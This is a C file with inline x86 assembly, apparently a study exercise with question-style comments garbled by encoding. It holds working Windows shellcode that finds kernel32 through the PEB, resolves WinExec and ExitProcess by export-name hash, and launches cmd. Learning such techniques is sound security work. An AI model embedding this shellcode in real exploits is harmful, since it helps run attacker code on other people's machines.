#include <stdio.h>
#include <tchar.h>

int _tmain(int argc, _TCHAR* argv[])
{
	__asm {
		jmp start

		get_func_addr :

		// get name table index
	loop_ent:
		inc edx			// index++
			lodsd			// eax = *esi , esi += 4
			pushad
			add	ebx, eax
			mov	esi, ebx
			xor eax, eax
			xor edi, edi
			hash :
		lodsb			// eax = *esi, esi += 1   
			add edi, eax	// edi += char
			test al, al
			jnz hash

			mov[ebp + 0x10], edi
			popad
			cmp[ebp + 0x10], edi // cmp export name hash, function hash
			jne loop_ent

			// get WinExec address
			movzx edx, word ptr[ecx + edx * 2 - 2]	// Ordinal
			mov edi, [ebp + 0x18]
			mov esi, [edi + 0x1c]					// Export Address Table
			mov edi, ebx
			add esi, edi							// Address Table
			add edi, [esi + edx * 4]
			mov eax, edi
			// edi = �Լ��ּ� ����
			ret

		start :
		// cmd
			xor eax, eax
			mov[ebp + 0xc], eax
			mov[ebp + 0xc], 0x63 // 0x63�� �ǹ�? 'c'
			mov[ebp + 0xd], 0x6d // 0x6d�� �ǹ�? 'm'
			mov[ebp + 0xe], 0x64 // 0x64�� �ǹ�? 'd'

		// kernel32.dll base address
			mov eax, fs:[eax + 0x30]	// eax�� ����Ǵ� ���� �ǹ�? PEB Address 
			mov eax, [eax + 0xc]		// eax�� ����Ǵ� ���� �ǹ�? LDR Address
			mov eax, [eax + 0x14]		// eax�� ����Ǵ� ���� �ǹ�? LDR_DATA_TABLE_ENTRY Address (�������� �ּ�) 
			mov ebx, [eax]				// ebx�� ����Ǵ� ���� �ǹ�? LDR_DATA_TABLE_ENTRY Address (ntdll.dll �ּ�) 
			mov ebx, [ebx]				// ebx�� ����Ǵ� ���� �ǹ�? LDR_DATA_TABLE_ENTRY Address (KERNEL32.dll �ּ�)
			mov ebx, [ebx + 0x10]		// ebx�� ����Ǵ� ���� �ǹ�? DllBase Address

		// export table (PE������ ����)
			mov edi, [ebx + 0x3c]		// 0x3c�� �ǹ�? NT_HEADER�� �� �� �ִ� Base �ּҷκ����� Offset ��      
			add edi, ebx				// edi�� ����Ǵ� ���� ������ ��Ÿ������? NT_HEADER ���� �ּ� 
			mov edi, [edi + 0x78]		// 0x78�� �ǹ�? Export Table �κ����� Offset �� 
			add edi, ebx				// edi�� ����Ǵ� ���� ������ ��Ÿ������? Export Table ���� �ּ� 
			mov[ebp + 0x18], edi		// Export Directory
			mov esi, [edi + 0x20]		// Export Name Table
			add esi, ebx				// esi�� ����Ǵ� ���� ������ ��Ÿ������? �Լ��� �迭 ���� �ּ� 
			mov ecx, [edi + 0x24]		// 0x24�� �ǹ�?, ecx�� ����Ǵ� ���� ������ ��Ÿ������? �Լ� ���� �迭�� ���� ���� Offset �������� Export Table ������ Offset ��
										// ecx -> �Լ� ���� �迭�� ���� ���� Offset �� 
			add ecx, ebx				// ecx�� ����Ǵ� ���� ������ ��Ÿ������? �Լ� ���� �迭 ���� �ּ� 
			xor edx, edx				// ebx�� ����Ǵ� ����? 0
			pushad						// pushad�� �ǹ�? ���� �������͵��� ���� ���ÿ� ���� 

		// get WinExec addr
			xor edi, edi 
			mov di, 0x2b3
			call get_func_addr
			mov[ebp + 0x20], eax
			popad

		// get ExitProcess addr
			xor edi, edi
			add di, 0x479
			call get_func_addr
			mov[ebp + 0x24], eax

		// call WinExec
			xor eax, eax			// eax�� �����? 0
			push eax
			lea	eax, [ebp + 0xc]	// cmd 
			push eax
			call[ebp + 0x20]		// WinExec('cmd',0)

			xor eax, eax
			push eax
			call[ebp + 0x24]		// ExitProcess(0)
	}

	return 0;
}
